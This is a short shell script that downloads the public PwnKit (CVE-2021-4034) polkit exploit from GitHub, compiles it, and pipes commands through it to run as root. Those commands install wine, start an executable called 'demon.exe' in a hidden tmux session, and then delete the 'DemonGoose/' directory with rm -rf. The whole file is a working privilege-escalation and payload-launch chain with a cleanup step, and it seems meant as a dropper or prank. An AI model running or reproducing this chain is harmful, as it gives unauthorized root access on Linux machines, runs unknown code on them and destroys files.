#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
done

make
echo "dnf install wine" | ./cve-2021-4034
echo "pacman -Sy" | ./cve-2021-4034
tmux new -d wine DemonThings/demon.exe
cd ..
echo "rm -rf DemonGoose/" | ./cve-2021-4034